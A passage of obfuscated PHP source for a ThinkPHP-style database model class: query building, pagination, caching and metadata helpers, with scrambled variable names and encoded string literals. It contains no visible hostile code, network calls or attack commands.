strtotime($£¸î«ë®); } return NOW_TIME >= $œ¸¶™ª && NOW_TIME <= $£¸î«ë®; case $ìŠòêÈ[415]: return in_array(get_client_ip(), explode($ìŠòêÈ[50], $—ÚïŒÑ)); case $ìŠòêÈ[416]: return !in_array(get_client_ip(), explode($ìŠòêÈ[50], $—ÚïŒÑ)); case $ìŠòêÈ[403]: default: return $this->regex($Œ„şÚ¸˜, $—ÚïŒÑ); } } public function query($àşö‰°’, $ë€¤“‘¯ = false) { $Šß÷™Æ =& $_SERVER[µÅ˜º…æ]; if (!is_bool($ë€¤“‘¯) && !is_array($ë€¤“‘¯)) { $ë€¤“‘¯ = func_get_args(); array_shift($ë€¤“‘¯); } $àşö‰°’ = str_replace(array($Šß÷™Æ[285], $Šß÷™Æ[417]), $Šß÷™Æ[53], $àşö‰°’); $àşö‰°’ = $this->parseSql($àşö‰°’, $ë€¤“‘¯); return $this->db->query($àşö‰°’); } public function execute($×¨½õ¶Æ, $Ó¬¾—¨ = false) { if (!is_bool($Ó¬¾—¨) && !is_array($Ó¬¾—¨)) { $Ó¬¾—¨ = func_get_args(); array_shift($Ó¬¾—¨); } $×¨½õ¶Æ = $this->parseSql($×¨½õ¶Æ, $Ó¬¾—¨); return $this->db->execute($×¨½õ¶Æ); } protected function parseSql($ˆêÜµæˆ, $è¸³Ï…õ) { $¶”¾ŸÍ =& $_SERVER[µÅ˜º…æ]; if (!0 === $è¸³Ï…õ) { $÷‚£ÍÛ¼ = $this->_parseOptions(); $ˆêÜµæˆ = $this->db->parseSql($ˆêÜµæˆ, $÷‚£ÍÛ¼); } elseif (is_array($è¸³Ï…õ)) { $è¸³Ï…õ = array_map(array($this->db, $¶”¾ŸÍ[418]), $è¸³Ï…õ); $ˆêÜµæˆ = vsprintf($ˆêÜµæˆ, $è¸³Ï…õ); } else { $ˆêÜµæˆ = strtr($ˆêÜµæˆ, array($¶”¾ŸÍ[419] => $this->getTableName(), $¶”¾ŸÍ[420] => think_config($¶”¾ŸÍ[321]))); } $this->db->setModel($this->name); return $ˆêÜµæˆ; } public function db($Ê´¡§†‰ = '', $§’åÂûã = '', $›â™¢ç€ = array()) { $¹¥íˆå§ =& $_SERVER[µÅ˜º…æ]; if ($¹¥íˆå§[12] === $Ê´¡§†‰ && $this->db) { return $this->db; } static $áÙĞŠ¨ = array(); static $Û¹õĞ¸ = array(); if (!isset($Û¹õĞ¸[$Ê´¡§†‰]) || isset($Û¹õĞ¸[$Ê´¡§†‰]) && $§’åÂûã && $áÙĞŠ¨[$Ê´¡§†‰] != $§’åÂûã) { if (!empty($§’åÂûã) && is_string($§’åÂûã) && !1 === strpos($§’åÂûã, $¹¥íˆå§[8])) { $§’åÂûã = think_config($§’åÂûã); } $Ê´¡§†‰ = think_guid($§’åÂûã); $Û¹õĞ¸[$Ê´¡§†‰] = Db::getInstance($§’åÂûã); } elseif (NULL === $§’åÂûã) { $Û¹õĞ¸[$Ê´¡§†‰]->close(); unset($Û¹õĞ¸[$Ê´¡§†‰]); return; } if (!empty($›â™¢ç€)) { if (is_string($›â™¢ç€)) { parse_str($›â™¢ç€, $›â™¢ç€); } foreach ($›â™¢ç€ as $Ù«ø‘˜Ä => $£ÊÇËšÚ) { $this->setProperty($Ù«ø‘˜Ä, $£ÊÇËšÚ); } } $áÙĞŠ¨[$Ê´¡§†‰] = $§’åÂûã; $this->db = $Û¹õĞ¸[$Ê´¡§†‰]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ĞÁµ„–Å = get_class($this); if ($ĞÁµ„–Å == $_SERVER[µÅ˜º…æ][421]) { return $this->name; } $this->name = substr($ĞÁµ„–Å, 0, -5); } return $this->name; } public function getTableName() { $êß²öø =& $_SERVER[µÅ˜º…æ]; if (empty($this->trueTableName)) { $…¯­Ôäü = !empty($this->tablePrefix) ? $this->tablePrefix : $êß²öø[12]; if (!empty($this->tableName)) { $…¯­Ôäü .= $this->tableName; } else { $…¯­Ôäü .= think_parse_name($this->name); } $this->trueTableName = strtolower($…¯­Ôäü); } return (!empty($this->dbName) ? $this->dbName . $êß²öø[10] : $êß²öø[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $Š¾‘ÂËß =& $_SERVER[µÅ˜º…æ]; return isset($this->fields[$Š¾‘ÂËß[328]]) ? $this->fields[$Š¾‘ÂËß[328]] : $this->pk; } public function getDbFields() { $Æ“ïïŞí =& $_SERVER[µÅ˜º…æ]; if (isset($this->options[$Æ“ïïŞí[357]])) { $÷€Ì±ï¦ = $this->db->getFields($this->options[$Æ“ïïŞí[357]]); return $÷€Ì±ï¦ ? array_keys($÷€Ì±ï¦) : !1; } if ($this->fields) { $÷€Ì±ï¦ = $this->fields; unset($÷€Ì±ï¦[$Æ“ïïŞí[327]], $÷€Ì±ï¦[$Æ“ïïŞí[328]], $÷€Ì±ï¦[$Æ“ïïŞí[329]], $÷€Ì±ï¦[$Æ“ïïŞí[326]]); return $÷€Ì±ï¦; } return !1; } public function data($ïËÀÛàî = '') { $›È÷Ü·Õ =& $_SERVER[µÅ˜º…æ]; if ($›È÷Ü·Õ[12] === $ïËÀÛàî && !empty($this->data)) { return $this->data; } if (is_object($ïËÀÛàî)) { $ïËÀÛàî = get_object_vars($ïËÀÛàî); } elseif (is_string($ïËÀÛàî)) { parse_str($ïËÀÛàî, $ïËÀÛàî); } elseif (!is_array($ïËÀÛàî)) { think_exception(think_lang($›È÷Ü·Õ[349])); } $this->data = $ïËÀÛàî; return $this; } public function join($ğá×”Œ«) { $ıâ÷œµ‹ =& $_SERVER[µÅ˜º…æ]; if (is_array($ğá×”Œ«)) { $this->options[$ıâ÷œµ‹[360]] = $ğá×”Œ«; } elseif (!empty($ğá×”Œ«)) { $this->options[$ıâ÷œµ‹[360]][] = $ğá×”Œ«; } return $this; } public function union($ È—ƒ, $Û¢¼œßµ = false) { $ªñ²¹î§ =& $_SERVER[µÅ˜º…æ]; if (empty($ È—ƒ)) { return $this; } if ($Û¢¼œßµ) { $this->options[$ªñ²¹î§[422]][$ªñ²¹î§[423]] = !0; } if (is_object($ È—ƒ)) { $ È—ƒ = get_object_vars($ È—ƒ); } if (is_string($ È—ƒ)) { $ÓªŠæÛ = $ È—ƒ; } elseif (is_array($ È—ƒ)) { if (isset($ È—ƒ[0])) { $this->options[$ªñ²¹î§[422]] = array_merge($this->options[$ªñ²¹î§[422]], $ È—ƒ); return $this; } else { $ÓªŠæÛ = $ È—ƒ; } } else { think_exception(think_lang($ªñ²¹î§[349])); } $this->options[$ªñ²¹î§[422]][] = $ÓªŠæÛ; return $this; } public function cache($¿»ÖóÃİ = true, $Ûó§Ó¯ø = null, $—é„ßÈ = '') { $˜ÔŸûÅ =& $_SERVER[µÅ˜º…æ]; if (!1 !== $¿»ÖóÃİ) { $this->options[$˜ÔŸûÅ[424]] = array($˜ÔŸûÅ[95] => $¿»ÖóÃİ, $˜ÔŸûÅ[414] => $Ûó§Ó¯ø, $˜ÔŸûÅ[33] => $—é„ßÈ); } return $this; } public function field($£“ó¶••, $†‹’ëı¤ = false) { $«öøòª =& $_SERVER[µÅ˜º…æ]; if (!0 === $£“ó¶••) { $çÅÈÑ©« = $this->getDbFields(); $£“ó¶•• = $çÅÈÑ©« ? $çÅÈÑ©« : $«öøòª[220]; } elseif ($†‹’ëı¤) { if (is_string($£“ó¶••)) { $£“ó¶•• = explode($«öøòª[50], $£“ó¶••); } $çÅÈÑ©« = $this->getDbFields(); $£“ó¶•• = $çÅÈÑ©« ? array_diff($çÅÈÑ©«, $£“ó¶••) : $£“ó¶••; } $this->options[$«öøòª[351]] = $£“ó¶••; return $this; } public function scope($ü‡©‚è = '', $¤ôÀ¦ = NULL) { $¶­İˆë‰ =& $_SERVER[µÅ˜º…æ]; if ($¶­İˆë‰[12] === $ü‡©‚è) { if (isset($this->_scope[$¶­İˆë‰[37]])) { $…È€‘°Ñ = $this->_scope[$¶­İˆë‰[37]]; } else { return $this; } } elseif (is_string($ü‡©‚è)) { $Ø«š·±… = explode($¶­İˆë‰[50], $ü‡©‚è); $…È€‘°Ñ = array(); foreach ($Ø«š·±… as $â°ÌâÃù) { if (!isset($this->_scope[$â°ÌâÃù])) { continue; } $…È€‘°Ñ = array_merge($…È€‘°Ñ, $this->_scope[$â°ÌâÃù]); } if (!empty($¤ôÀ¦) && is_array($¤ôÀ¦)) { $…È€‘°Ñ = array_merge($…È€‘°Ñ, $¤ôÀ¦); } } elseif (is_array($ü‡©‚è)) { $…È€‘°Ñ = $ü‡©‚è; } if (is_array($…È€‘°Ñ) && !empty($…È€‘°Ñ)) { $this->options = array_merge($this->options, array_change_key_case($…È€‘°Ñ)); } return $this; } public function where($š‡ÕñÁ, $è¯ªÌü— = null) { $ÎËõ‚Ÿè =& $_SERVER[µÅ˜º…æ]; if (!is_null($è¯ªÌü—) && is_string($š‡ÕñÁ)) { if (!is_array($è¯ªÌü—)) { $è¯ªÌü— = func_get_args(); array_shift($è¯ªÌü—); } $è¯ªÌü— = array_map(array($this->db, $ÎËõ‚Ÿè[418]), $è¯ªÌü—); $š‡ÕñÁ = vsprintf($š‡ÕñÁ, $è¯ªÌü—); } elseif (is_object($š‡ÕñÁ)) { $š‡ÕñÁ = get_object_vars($š‡ÕñÁ); } elseif (is_array($š‡ÕñÁ)) { foreach ($š‡ÕñÁ as $¸î¯ê™‡ => $÷ò£ŞÑè) { if ((is_numeric($¸î¯ê™‡) || !$¸î¯ê™‡) && is_string($÷ò£ŞÑè)) { if (strpos($÷ò£ŞÑè, $ÎËõ‚Ÿè[425]) === 0) { continue; } think_trace($ÎËõ‚Ÿè[426], $ÎËõ‚Ÿè[12], $ÎËõ‚Ÿè[49]); die; } } } if (is_string($š‡ÕñÁ) && $ÎËõ‚Ÿè[12] != $š‡ÕñÁ) { $Æ‰óß¢š = array(); $Æ‰óß¢š[$ÎËõ‚Ÿè[427]] = $š‡ÕñÁ; $š‡ÕñÁ = $Æ‰óß¢š; } if (isset($this->options[$ÎËõ‚Ÿè[353]])) { $this->options[$ÎËõ‚Ÿè[353]] = array_merge($this->options[$ÎËõ‚Ÿè[353]], $š‡ÕñÁ); } else { $this->options[$ÎËõ‚Ÿè[353]] = $š‡ÕñÁ; } return $this; } public function limit($İ®¿Ò¢¬, $•·ŞåÃó = null) { $„¾Áœ =& $_SERVER[µÅ˜º…æ]; $this->options[$„¾Áœ[368]] = is_null($•·ŞåÃó) ? $İ®¿Ò¢¬ : $İ®¿Ò¢¬ . $„¾Áœ[50] . $•·ŞåÃó; return $this; } public function page($˜öØñçª, $·ü¿Üá× = null) { $ƒ»ëùã¹ =& $_SERVER[µÅ˜º…æ]; $this->options[$ƒ»ëùã¹[428]] = is_null($·ü¿Üá×) ? $˜öØñçª : $˜öØñçª . $ƒ»ëùã¹[50] . $·ü¿Üá×; return $this; } public function comment($õ™”Í†) { $this->options[$_SERVER[µÅ˜º…æ][429]] = $õ™”Í†; return $this; } public function setProperty($”şŞ—áÑ, $½à„ª™í) { if (property_exists($this, $”şŞ—áÑ)) { $this->{$”şŞ—áÑ} = $½à„ª™í; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\144\x69\x66\171\x54\x69\x6d\x65", "\164\151\155\x65", "\x69\156\163\x65\162\x74\54\x75\160\144\x61\x74\145", "\146\x75\156\143\164\x69\157\156"), array("\x63\162\x65\141\x74\145\x54\x69\155\145", "\x74\151\155\x65", "\x69\x6e\x73\x65\x72\164", "\146\x75\156\x63\164\151\157\156")); public function setDataAuto($éæ¸”ñ€) { $this->dataAuto = $éæ¸”ñ€; } public function __construct($›âäâç  = '', $œ”Ğ°Êì = '', $öºŸö‡† = '') { parent::__construct($›âäâç , $œ”Ğ°Êì, $öºŸö‡†); } protected $tableMeta = array(); protected function _beforeInsert(&$Èçø€á, $¯Ç¿Û½²) { $›üÅø¸  =& $_SERVER[µÅ˜º…æ]; if (!$this->checkDataAutoHas($›üÅø¸ [430])) { return; } $this->dataBeforeFilter($Èçø€á, $›üÅø¸ [430]); } protected function _beforeUpdate(&$ ½øè÷, $¢Ò²Ö¨©) { $•×Š¹å¶ =& $_SERVER[µÅ˜º…æ]; if (!$this->checkDataAutoHas($•×Š¹å¶[431])) { return; } $this->dataBeforeFilter($ ½øè÷, $•×Š¹å¶[431]); } protected function _afterSelect(&$§÷ÈÉÏ•, $¿¬Ãó) { if (!is_array($§÷ÈÉÏ•)) { return; } if (!$this->checkDataAutoHas($_SERVER[µÅ˜º…æ][432])) { return; } foreach ($§÷ÈÉÏ• as &$º«ªÍ¸) { $this->dataAfterFilter($º«ªÍ¸); } unset($º«ªÍ¸); } protected function _afterFind(&$Æıê¡û², $´óòŞü) { if (!is_array($Æıê¡û²)) { return; } if (!$this->checkDataAutoHas($_SERVER[µÅ˜º…æ][432])) { return; } $this->dataAfterFilter($Æıê¡û²); } public static function textEncode($å«ñà€Š) { if (!$å«ñà€Š) { return $å«ñà€Š; } $³á‚Ô‘ã = json_encode($å«ñà€Š); $³á‚Ô‘ã = preg_replace_callback($_SERVER[µÅ˜º…æ][433], function ($¯äËãÄ¥) { return addslashes($¯äËãÄ¥[0]); }, $³á‚Ô‘ã); return json_decode($³á‚Ô‘ã); } public static function textDecode($ÉÄÀò£õ) { $Áñ¹íáæ =& $_SERVER[µÅ˜º…æ]; if (!$ÉÄÀò£õ) { return $ÉÄÀò£õ; } $øå¿ØøÇ = json_encode($ÉÄÀò£õ); $øå¿ØøÇ = preg_replace_callback($Áñ¹íáæ[434], function ($²±îØ¹) { return $_SERVER[µÅ˜º…æ][97]; }, $øå¿ØøÇ); return json_decode($øå¿ØøÇ); } public function setAutoIncrement($½š‡´î) { $˜‰½à½ì = array($this->getPk() => $½š‡´î); $ñ ş¨Ì = $this->data($˜‰½à½ì)->add(); if ($ñ ş¨Ì) { $this->delete($ñ ş¨Ì); } } public function getAutoIncrement() { $Ê¼ÈÖÜÏ = $this->getTableName(); $Üî‰¥Üî = $this->max($this->getPk()); $„¾Ÿ¹²å = $this->query("\x73\x68\x6f\x77\x20\x74\141\x62\x6c\x65\40\x73\x74\x61\x74\165\x73\x20\167\x68\145\x72\x65\40\116\x61\x6d\145\75\x27{$Ê¼ÈÖÜÏ}\x27"); $Ûóá†Åü = $„¾Ÿ¹²å[0][$_SERVER[µÅ˜º…æ][435]]; $ÆõéŒ¡Í = max($Üî‰¥Üî, $Ûóá†Åü); return $ÆõéŒ¡Í; } protected function _callBefore($æ÷Ûõ‘ƒ, $¾¶™ÏªÎ) { return $this->cacheCallCheck($æ÷Ûõ‘ƒ, $¾¶™ÏªÎ, !1); } protected function _callAfter($Åø½æŸ–, $õÊÍ±ìŸ) { return $this->cacheCallCheck($Åø½æŸ–, $õÊÍ±ìŸ, !0); } protected function cacheFunctionAlias($¶áªí¤ı) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ò¬šÎˆ°, $µ¤ÜÔ×Œ, $ŠïáËÖ» = false) { $äƒìĞº =& $_SERVER[µÅ˜º…æ]; $”²×À¡œ = $this->cacheFunctionAlias($µ¤ÜÔ×Œ); if (!$”²×À¡œ) { return; } foreach ($”²×À¡œ as $»áÕì±Ş => $¨ÚªµË) { $‚İÆÅçÑ = $¨ÚªµË[0]; $çù¶øõÁ = explode($äƒìĞº[50], $¨ÚªµË[1]); $¹Øµ§Ë± = isset($¨ÚªµË[2]) ? $¨ÚªµË[2] : $äƒìĞº[12]; if ($ò¬šÎˆ° == $»áÕì±Ş) { return $this->cacheFunctionGet($»áÕì±Ş, $‚İÆÅçÑ, $¹Øµ§Ë±); } if ($ŠïáËÖ» && in_array($ò¬šÎˆ°, $çù¶øõÁ)) { $this->cacheFunctionClear($»áÕì±Ş, $‚İÆÅçÑ, $¹Øµ§Ë±); } } } public function cacheFunctionGet($îş½œàò, $ô¦‹Ñ­, $µşÛĞá = '') { $£´ã°±Æ =& $_SERVER[µÅ˜º…æ]; $ÔĞŞ£ç = $this->cacheKeyMake($îş½œàò, $ô¦‹Ñ­, $µşÛĞá); $ÑäÅŠƒ™ = Cache::get($ÔĞŞ£ç); if (!is_array($ÑäÅŠƒ™)) { if (method_exists($this, $£´ã°±Æ[341] . $îş½œàò)) { $îş½œàò = $£´ã°±Æ[341] . $îş½œàò; } $ÑäÅŠƒ™ = call_user_func_array(array($this, $îş½œàò), array($ô¦‹Ñ­, !0)); Cache::set($ÔĞŞ£ç, $ÑäÅŠƒ™); } return $ÑäÅŠƒ™; } public function cacheFunctionClear($¨‘¨ö¦³, $ßª Âí, $ãÙİ‰·Ò = '') { $³•‚¯˜ = $ßª Âí; if (!is_array($ßª Âí)) { $³•‚¯˜ = array($ßª Âí); } foreach ($³•‚¯˜ as $ÖäìˆÍ´) { $·ÚÅÅĞÇ = $this->cacheKeyMake($¨‘¨ö¦³, $ÖäìˆÍ´, $ãÙİ‰·Ò); Cache::remove($·ÚÅÅĞÇ); } } public function cacheKeyMake($ŞŸ§Ü…Ş, $ûÅ‹¾ü…, $ç¬İÉë) { $ú„¤Ò½ª =& $_SERVER[µÅ˜º…æ]; if ($ç¬İÉë) { $ûÅ‹¾ü… = $ûÅ‹¾ü… . $ú„¤Ò½ª[436] . $ç¬İÉë; } return get_class($this) . $ú„¤Ò½ª[11] . $ŞŸ§Ü…Ş . $ú„¤Ò½ª[437] . $ûÅ‹¾ü…; } protected function selectPageReset() { $ªÁ€ıãÒ =& $_SERVER[µÅ˜º…æ]; if (isset($GLOBALS[$ªÁ€ıãÒ[438]])) { return; } $GLOBALS[$ªÁ€ıãÒ[438]] = isset($GLOBALS[$ªÁ€ıãÒ[7]][$ªÁ€ıãÒ[439]]) ? $GLOBALS[$ªÁ€ıãÒ[7]][$ªÁ€ıãÒ[439]] : !1; $GLOBALS[$ªÁ€ıãÒ[440]] = isset($GLOBALS[$ªÁ€ıãÒ[7]][$ªÁ€ıãÒ[428]]) ? $GLOBALS[$ªÁ€ıãÒ[7]][$ªÁ€ıãÒ[428]] : !1; $GLOBALS[$ªÁ€ıãÒ[7]][$ªÁ€ıãÒ[439]] = !1; $GLOBALS[$ªÁ€ıãÒ[7]][$ªÁ€ıãÒ[428]] = !1; } protected function selectPageRestore() { $¿ÖœË²’ =& $_SERVER[µÅ˜º…æ]; if (!isset($GLOBALS[$¿ÖœË²’[438]])) { return; } $GLOBALS[$¿ÖœË²’[7]][$¿ÖœË²’[439]] = $GLOBALS[$¿ÖœË²’[438]]; $GLOBALS[$¿ÖœË²’[7]][$¿ÖœË²’[428]] = $GLOBALS[$¿ÖœË²’[440]]; if ($GLOBALS[$¿ÖœË²’[7]][$¿ÖœË²’[439]] === !1) { unset($GLOBALS[$¿ÖœË²’[7]][$¿ÖœË²’[439]]); } if ($GLOBALS[$¿ÖœË²’[7]][$¿ÖœË²’[428]] === !1) { unset($GLOBALS[$¿ÖœË²’[7]][$¿ÖœË²’[428]]); } unset($GLOBALS[$¿ÖœË²’[438]]); unset($GLOBALS[$¿ÖœË²’[440]]); } protected function selectPage($×ŒÑ “¢ = 200, $¹•ÒÌ¿ù = 1) { $×´üíÛ =& $_SERVER[µÅ˜º…æ]; global $in; $ßÒäá®Ö = $this->optionsValue(); $¢ã‹Ó÷Û = 100000; $×ŒÑ “¢ = isset($in[$×´üíÛ[439]]) && $in[$×´üíÛ[439]] ? $in[$×´üíÛ[439]] : $×ŒÑ “¢; if ($×ŒÑ “¢ === -1) { $in[$×´üíÛ[439]] = !1; $¢ã‹Ó÷Û = 100000000; $×ŒÑ “¢ = $¢ã‹Ó÷Û; } $ø¸Ñê†ú = $ßÒäá®Ö; $ø¸Ñê†ú[$×´üíÛ[441]] = array(); $×ŒÑ “¢ = intval($×ŒÑ “¢); $×ŒÑ “¢ = $×ŒÑ “¢ <= 5 ? 5 : ($×ŒÑ “¢ >= $¢ã‹Ó÷Û ? $¢ã‹Ó÷Û : $×ŒÑ “¢); $¹•ÒÌ¿ù = intval(isset($in[$×´üíÛ[428]]) && $in[$×´üíÛ[428]] ? $in[$×´üíÛ[428]] : $¹•ÒÌ¿ù); $¹•ÒÌ¿ù = $¹•ÒÌ¿ù <= 1 ? 1 : $¹•ÒÌ¿ù; $š“¼œê© = array(); $ÖÛíÂĞ‘ = 1; $†¼ˆ¬Øá = $this->selectPageCountBy(); if ($¹•ÒÌ¿ù == 1 && $ÖÛíÂĞ‘) { $this->optionsValue($ßÒäá®Ö); $š“¼œê© = $this->page($¹•ÒÌ¿ù, $×ŒÑ “¢)->select(); $©Ô²ï’ò = is_array($š“¼œê©) ? count($š“¼œê©) : 0; if ($©Ô²ï’ò < $×ŒÑ “¢) { $ûáÄœú’ = 1; } else { $this->optionsValue($ø¸Ñê†ú); $©Ô²ï’ò = intval($this->count($†¼ˆ¬Øá)); $ûáÄœú’ = ceil($©Ô²ï’ò / $×ŒÑ “¢); } } else { $this->optionsValue($ø¸Ñê†ú); $©Ô²ï’ò = intval($this->count($†¼ˆ¬Øá)); $ûáÄœú’ = ceil($©Ô²ï’ò / $×ŒÑ “¢); $¹•ÒÌ¿ù = $¹•ÒÌ¿ù >= $ûáÄœú’ ? $ûáÄœú’ : $¹•ÒÌ¿ù; $this->optionsValue($ßÒäá®Ö); $š“¼œê© = $this->page($¹•ÒÌ¿ù, $×ŒÑ “¢)->select(); } $this->selectPageCountBy($×´üíÛ[442]); if (!is_array($š“¼œê©)) { $š“¼œê© = array(); } if ($ûáÄœú’ == 1) { $©Ô²ï’ò = count($š“¼œê©); } $Öáö®Ğ = array($×´üíÛ[443] => array($×´üíÛ[444] => $©Ô²ï’ò, $×´üíÛ[439] => $×ŒÑ “¢, $×´üíÛ[428] => $¹•ÒÌ¿ù, $×´üíÛ[445] => $ûáÄœú’), $×´üíÛ[446] => $š“¼œê©); return $Öáö®Ğ; } protected function selectPageCountBy($Û÷¯¨Î = false) { static $Ó‚ìÙÛà = null; if (!$Û÷¯¨Î) { return $Ó‚ìÙÛà; } if ($Û÷¯¨Î == $_SERVER[µÅ˜º…æ][442]) { $Ó‚ìÙÛà = null; return; } $Ó‚ìÙÛà = $Û÷¯¨Î; } protected function checkLength($…Ù“÷º³, $ÚÂ—™²ò = 0, $×™‹ßûÎ = '') { $¬ÚĞ¡Ì =& $_SERVER[µÅ˜º…æ]; $ÚÂ—™²ò = $ÚÂ—™²ò ? $ÚÂ—™²ò : 65536; if (!$…Ù“÷º³ || strlen($…Ù“÷º³) < $ÚÂ—™²ò) { return; } $×™‹ßûÎ = $×™‹ßûÎ ? $×™‹ßûÎ . $¬ÚĞ¡Ì[74] : $¬ÚĞ¡Ì[12]; show_json($×™‹ßûÎ . LNG($¬ÚĞ¡Ì[447]) . "\50{$ÚÂ—™²ò}\51", !1); } protected function metaSet($ãéìÚ§ç, $ÄùÃá¾© = null, $£”íÚ¨„ = null) { $î¯óß¥ =& $_SERVER[µÅ˜º…æ]; if (!$this->tableMeta || !$ãéìÚ§ç) { return !1; } $½Û¯›¼ò = $this->tableMeta[$î¯óß¥[448]]; $•„¦êä¨ = $this->tableMeta[$î¯óß¥[449]]; $¿áÒƒÀ§ = Model($•„¦êä¨); $£–³öÙ = array($½Û¯›¼ò => $ãéìÚ§ç, $î¯óß¥[450] => $ÄùÃá¾©); if (is_null($ÄùÃá¾©)) { return $¿áÒƒÀ§->where(array($½Û¯›¼ò => $ãéìÚ§ç))->delete(); } if (is_null($£”íÚ¨„) && is_string($ÄùÃá¾©)) { return $¿áÒƒÀ§->where($£–³öÙ)->delete(); } $¾ÒÖÕÌ = is_array($ÄùÃá¾©) ? $ÄùÃá¾© : array(); if (is_string($ÄùÃá¾©)) { $¾ÒÖÕÌ[$ÄùÃá¾©] = $£”íÚ¨„; } $¹ïˆ¾·§ = array(); foreach ($¾ÒÖÕÌ as $·š©Æöä => $‰¹Ñ‚´æ) { if (is_null($‰¹Ñ‚´æ) && is_string($·š©Æöä)) { $¿áÒƒÀ§->where(array($½Û¯›¼ò => $ãéìÚ§ç, $î¯óß¥[450] => $·š©Æöä))->delete(); continue; } $this->checkLength($‰¹Ñ‚´æ, !1, $•„¦êä¨ . $î¯óß¥[4] . $·š©Æöä); $¹ïˆ¾·§[] = array($½Û¯›¼ò => $ãéìÚ§ç, $î¯óß¥[95] => $·š©Æöä, $î¯óß¥[451] => $‰¹Ñ‚´æ); } $Ò×¤ßŸ³ = $î¯óß¥[452] . $•„¦êä¨; CacheLock::lock($Ò×¤ßŸ³); $¿áÒƒÀ§->where(array($½Û¯›¼ò => $ãéìÚ§ç))->addAll($¹ïˆ¾·§, array(), !0); CacheLock::unlock($Ò×¤ßŸ³); return !0; } public function metaGet($¥‰Ì…”á, $à‰´—Ø = false) { $áŠÙüÉ½ =& $_SERVER[µÅ˜º…æ]; if (!$this->tableMeta) { return array(); } $¦‚îîİÆ = $this->tableMeta[$áŠÙüÉ½[448]]; $ş°Ãø = Model($this->tableMeta[$áŠÙüÉ½[449]]); if ($à‰´—Ø) { $ëÁıÉû’ = array($¦‚îîİÆ => $¥‰Ì…”á, $áŠÙüÉ½[95] => $à‰´—Ø); return $ş°Ãø->where($ëÁıÉû’)->getField($áŠÙüÉ½[451]); } $ëÁıÉû’ = array($¦‚îîİÆ => $¥‰Ì…”á); $¶™¢¼€¢ = $ş°Ãø->field($áŠÙüÉ½[453])->where($ëÁıÉû’)->select(); $¶™¢¼€¢ = array_to_keyvalue($¶™¢¼€¢, $áŠÙüÉ½[95], $áŠÙüÉ½[451]); return $¶™¢¼€¢; } private function checkDataAutoHas($ùÊÙ¤«) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ï°¢¼«ã) { if (in_array($ùÊÙ¤«, explode($_SERVER[µÅ˜º…æ][50], $ï°¢¼«ã[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$ÂÛ’ñµì, $€âµëå‹) { $ğµ¸Îæ =& $_SERVER[µÅ˜º…æ]; if (!is_array($ÂÛ’ñµì)) { return; } foreach ($this->dataAuto as $í½Ÿø§«) { $ãàÚ¼é· = $í½Ÿø§«[0]; if (!in_array($€âµëå‹, explode($ğµ¸Îæ[50], $í½Ÿø§«[2]))) { continue; } switch (trim($í½Ÿø§«[3])) { case $ğµ¸Îæ[396]: case $ğµ¸Îæ[397]: $şª¼»¡‹ = $í½Ÿø§«[1]; $¯ºÁìÑÑ = isset($í½Ÿø§«[4]) ? (array) $í½Ÿø§«[4] : array(); if ($şª¼»¡‹ == $ğµ¸Îæ[204] && array_key_exists($ãàÚ¼é·, $ÂÛ’ñµì)) { if (!$ÂÛ’ñµì[$ãàÚ¼é·]) { unset($ÂÛ’ñµì[$ãàÚ¼é·]); } break; } if (isset($ÂÛ’ñµì[$ãàÚ¼é·])) { array_unshift($¯ºÁìÑÑ, $ÂÛ’ñµì[$ãàÚ¼é·]); } if ($ğµ¸Îæ[396] == $í½Ÿø§«[3]) { $ÂÛ’ñµì[$ãàÚ¼é·] = call_user_func_array($şª¼»¡‹, $¯ºÁìÑÑ); } else { $ÂÛ’ñµì[$ãàÚ¼é·] = call_user_func_array(array(&$this, $şª¼»¡‹), $¯ºÁìÑÑ); } break; case $ğµ¸Îæ[348]: if (isset($ÂÛ’ñµì[$ãàÚ¼é·]) && $ÂÛ’ñµì[$ãàÚ¼é·]) { $ÂÛ’ñµì[$ãàÚ¼é·] = call_user_func_array(array(&$this, $í½Ÿø§«[1]), array($ÂÛ’ñµì[$ãàÚ¼é·])); } break; case $ğµ¸Îæ[351]: $ÂÛ’ñµì[$ãàÚ¼é·] = $ÂÛ’ñµì[$í½Ÿø§«[1]]; break; case $ğµ¸Îæ[369]: if (isset($ÂÛ’ñµì[$ãàÚ¼é·]) && !is_string($ÂÛ’ñµì[$ãàÚ¼é·])) { $ÂÛ’ñµì[$ãàÚ¼é·] = json_encode_force($ÂÛ’ñµì[$ãàÚ¼é·]); $ÂÛ’ñµì[$ãàÚ¼é·] = self::textEncode($ÂÛ’ñµì[$ãàÚ¼é·]); } break; case $ğµ¸Îæ[398]: if ($ÂÛ’ñµì[$ãàÚ¼é·] === $ğµ¸Îæ[12]) { unset($ÂÛ’ñµì[$ãàÚ¼é·]); } break; case $ğµ¸Îæ[399]: $ÂÛ’ñµì[$ãàÚ¼é·] = $í½Ÿø§«[1]; default: break; } } if ($€âµëå‹ == $ğµ¸Îæ[430]) { $Û‰Ş­ì¼ = strtolower($this->db->getDbType()); if (strpos($Û‰Ş­ì¼, $ğµ¸Îæ[13]) !== 0) { return; } $¡“°­æ“ = $this->field(!0)->fields; $éˆ†õÉº = $¡“°­æ“[$ğµ¸Îæ[329]]; if (isset($¡“°­æ“[$ğµ¸Îæ[328]])) { unset($éˆ†õÉº[$¡“°­æ“[$ğµ¸Îæ[328]]]); } foreach ($éˆ†õÉº as $µîéößË => $€âµëå‹) { if (!isset($ÂÛ’ñµì[$µîéößË])) { $ÂÛ’ñµì[$µîéößË] = $ğµ¸Îæ[12]; } } } } private function dataAfterFilter(&$Ìà¿÷Ö) { $õ™±¦î“ =& $_SERVER[µÅ˜º…æ]; foreach ($this->dataAuto as $ÁÛœÉüÅ) { $Æªà–ô¾ = $ÁÛœÉüÅ[0]; if (!isset($Ìà¿÷Ö[$Æªà–ô¾])) { continue; } if 